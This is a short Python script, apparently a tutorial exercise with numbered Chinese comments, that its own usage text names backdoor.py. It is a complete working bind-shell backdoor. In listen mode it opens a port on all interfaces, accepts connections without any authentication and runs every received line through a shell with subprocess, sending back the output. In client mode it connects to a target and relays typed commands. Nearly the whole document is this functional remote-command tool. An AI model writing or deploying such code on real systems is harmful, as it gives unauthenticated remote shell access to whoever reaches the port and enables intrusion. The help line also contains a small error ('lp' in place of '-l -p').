# 1. 编写usage函数
# 2. 利用getopt模块从命令行获取参数值
# 3. 区分客户端和服务端
# 4. 定义客户端代码，发送命令，接收服务端命令行的回显内容
# 5. 定义服务端代码，接收命令，发送执行命令后的结果给客户端
# 6. 定义命令执行函数，执行客户端发送的命令
import socket
import getopt
import sys
import subprocess
from threading import Thread


def main():
    target = ""
    port = 0
    listen = False
    help = False
    # 2. 利用getopt模块从命令行获取参数值
    opts, args = getopt.getopt(sys.argv[1:], "t:p:hl")
    for o, a in opts:
        if o == "-t":
            target = a
        elif o == "-p":
            port = int(a)
        elif o == "-h":
            help = True
        elif o == "-l":
            listen = True

    if help:
        usage()
    # 3. 区分客户端和服务端
    elif not listen:
        client_handle(target, port)
    else:
        server_handle(port)


# 4. 定义客户端代码，发送命令，接收服务端命令行的回显内容
def client_handle(target, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))
    # 接收数据
    while True:
        recv_len = 1
        response = "".encode('utf-8')  # bytes
        while recv_len:
            data = client.recv(4096)
            recv_len = len(data)
            response += data
            if recv_len < 4096:
                break
        print(response.decode('gbk'), end="")

        # 发送命令
        buffer = input("")
        buffer += "\n"
        client.send(buffer.encode('utf-8'))  # bytes


# 5. 定义服务端代码，接收命令，发送执行命令后的结果给客户端
def server_handle(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(10)
    print("[*] Listening on 0.0.0.0:%d" % port)
    while True:
        client_socket, addr = server.accept()
        print("[*] Accept connection from %s:%d" % (addr[0], addr[1]))
        t = Thread(target=run_command, args=(client_socket, ))
        t.start()


# 6. 定义命令执行函数，执行客户端发送的命令
def run_command(client_socket):
    while True:
        client_socket.send(b"shell_>")
        cmd_buffer = "".encode('utf-8')  # bytes
        while b"\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)
        cmd_buffer = cmd_buffer.decode()  # str
        try:
            out = subprocess.check_output(cmd_buffer, stderr=subprocess.STDOUT, shell=True)
            client_socket.send(out)
        except:
            client_socket.send(b"Falsed to execute command.\r\n")


# 1. 编写usage函数
def usage():
    print("help info: python backdoor.py -h")
    print("client: python backdoor.py -t [target] -p [port]")
    print("server: python backdoor.py lp [port]")
    sys.exit()


if __name__ == '__main__':
    main()
